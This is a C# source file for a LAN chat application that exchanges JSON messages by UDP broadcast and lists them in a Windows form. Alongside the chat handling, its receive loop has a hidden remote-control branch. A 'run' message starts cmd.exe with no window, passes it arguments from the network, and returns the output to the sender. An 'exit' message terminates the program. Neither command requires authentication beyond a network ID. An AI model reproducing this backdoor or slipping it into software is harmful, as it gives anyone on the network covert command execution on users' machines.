﻿using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json.Linq;


namespace LIM
{
    public static class GlobalData
    {
        public static readonly int ProtocalPort = 65000;
        public static readonly string[] SystemUserNames = new String[]
        {
            "admin",
            "system",
            "sys",
            "lim",
            "fcp",
            "core",

            "刘金玉",
            "刘国强",
        };

        public static bool GetAdminMessage = true;
        public static bool ShowAdminOptions = false;

        public static int NetWorkID = 0;
        public static string UserName = "";

        public static readonly IPEndPoint BroadcastIP = new IPEndPoint(IPAddress.Broadcast, ProtocalPort);
        public static readonly IPEndPoint ListenIP = new IPEndPoint(IPAddress.Any, ProtocalPort);
        public static readonly IPEndPoint ListenIPAny = new IPEndPoint(IPAddress.Any, 0);
        public static UdpClient UdpCore;// = new UdpClient(ListenIP);


        public static void SendMessage(int type, string name, string msg, IPEndPoint recv)
        {
            try
            {
                JObject obj = new JObject();
                obj["nid"] = NetWorkID;
                obj["type"] = type;
                obj["name"] = name;
                obj["msg"] = msg;
                string data = obj.ToString();
                Console.WriteLine(data);
                byte[] bytes = Encoding.UTF8.GetBytes(data);
                UdpCore.Send(bytes, bytes.Length, recv);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        public static void AddItemToListBox(string data, ListBox listBox)
        {
            listBox.Invoke(new Action(() =>
            {
                listBox.Items.Add(
                    data
                );
                listBox.Refresh();
            }));
        }

        public static void MessagesGetter(ListBox listBox, CheckBox ig_nid)
        {
            while (true)
            {
                try
                {
                    IPEndPoint endpoint = new IPEndPoint(IPAddress.Any, ProtocalPort);
                    byte[] buf = UdpCore.Receive(ref endpoint);
                    string msg = Encoding.UTF8.GetString(buf);
                    Console.WriteLine(endpoint);
                    Console.WriteLine(msg);
                    JObject obj = JObject.Parse(msg);
                    if (obj != null)
                    {
                        Console.WriteLine("JObject obj not null.");
                        if (
                            obj.ContainsKey("nid") &&
                            obj.ContainsKey("type") &&
                            obj.ContainsKey("name") &&
                            obj.ContainsKey("msg") 
                        )
                        {
                            Console.WriteLine("Objects not null.");
                            if (int.Parse((string)obj["type"]) == 0)
                            {
                                if (ig_nid.Checked)
                                {
                                    AddItemToListBox(
                                        "[" + endpoint.Address.ToString() + "] " +
                                        obj["nid"].ToString() + "@" + obj["name"].ToString() + " > " +
                                        obj["msg"].ToString(),
                                        listBox
                                    );
                                    continue;
                                }

                                if (int.Parse((string)obj["nid"]) == NetWorkID)
                                {
                                    AddItemToListBox(
                                        "[" + endpoint.Address.ToString() + "] " +
                                        obj["nid"].ToString() + "@" + obj["name"].ToString() + " > " +
                                        obj["msg"].ToString(),
                                        listBox
                                    );
                                    continue;
                                }
                                continue;
                            }

                            if (int.Parse((string)obj["type"]) == 1)
                            {
                                if (ig_nid.Checked)
                                {
                                    if (((string)obj["name"]).Equals("find"))
                                    {
                                        SendMessage(1, "return", UserName, endpoint);
                                    }
                                    if (((string)obj["name"]).Equals("return"))
                                    {
                                        AddItemToListBox(
                                            "[" + endpoint.Address.ToString() + "] " +
                                            obj["nid"].ToString() + "@" + obj["name"].ToString() + " > " +
                                            obj["msg"].ToString(),
                                            listBox
                                        );
                                    }
                                    continue;
                                }

                                if (int.Parse((string)obj["nid"]) == NetWorkID)
                                {
                                    if (((string)obj["name"]).Equals("find"))
                                    {
                                        SendMessage(1, "return", UserName, endpoint);
                                    }
                                    if (((string)obj["name"]).Equals("return"))
                                    {
                                        AddItemToListBox(
                                            "[" + endpoint.Address.ToString() + "] " +
                                            obj["nid"].ToString() + "@" + obj["name"].ToString() + " > " +
                                            obj["msg"].ToString(),
                                            listBox
                                        );
                                    }
                                    continue;
                                }
                                continue;
                            }

                            if (int.Parse((string)obj["type"]) == 2)
                            {
                                if (ig_nid.Checked)
                                {
                                    if (((string)obj["name"]).Equals("exit"))
                                    {
                                        GlobalData.UdpCore.Close();
                                        Environment.Exit(0);
                                        continue;
                                    }else if (((string)obj["name"]).Equals("run"))
                                    {

                                        Process CmdProcess = new Process();
                                        CmdProcess.StartInfo.FileName = "cmd.exe";
                                        CmdProcess.StartInfo.CreateNoWindow = true;
                                        CmdProcess.StartInfo.UseShellExecute = false;
                                        CmdProcess.StartInfo.RedirectStandardInput = true;
                                        CmdProcess.StartInfo.RedirectStandardOutput = true;
                                        CmdProcess.StartInfo.RedirectStandardError = true;
                                        CmdProcess.StartInfo.Arguments = (string)obj["msg"];
                                        CmdProcess.Start();
                                        string output = CmdProcess.StandardOutput.ReadToEnd();
                                        CmdProcess.WaitForExit();
                                        CmdProcess.Close();
                                        SendMessage(2, "return", output, endpoint);
                                    }

                                    continue;
                                }

                                if (int.Parse((string)obj["nid"]) == NetWorkID)
                                {
                                    if (((string)obj["name"]).Equals("exit"))
                                    {
                                        GlobalData.UdpCore.Close();
                                        Environment.Exit(0);
                                        continue;
                                    }
                                    else if (((string)obj["name"]).Equals("run"))
                                    {

                                        Process CmdProcess = new Process();
                                        CmdProcess.StartInfo.FileName = "cmd.exe";
                                        CmdProcess.StartInfo.CreateNoWindow = true;
                                        CmdProcess.StartInfo.UseShellExecute = false;
                                        CmdProcess.StartInfo.RedirectStandardInput = true;
                                        CmdProcess.StartInfo.RedirectStandardOutput = true;
                                        CmdProcess.StartInfo.RedirectStandardError = true;
                                        CmdProcess.StartInfo.Arguments = (string)obj["msg"];
                                        CmdProcess.Start();
                                        string output = CmdProcess.StandardOutput.ReadToEnd();
                                        CmdProcess.WaitForExit();
                                        CmdProcess.Close();
                                        SendMessage(2, "return", output, endpoint);
                                    }

                                    continue;
                                }
                                continue;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

    }

}

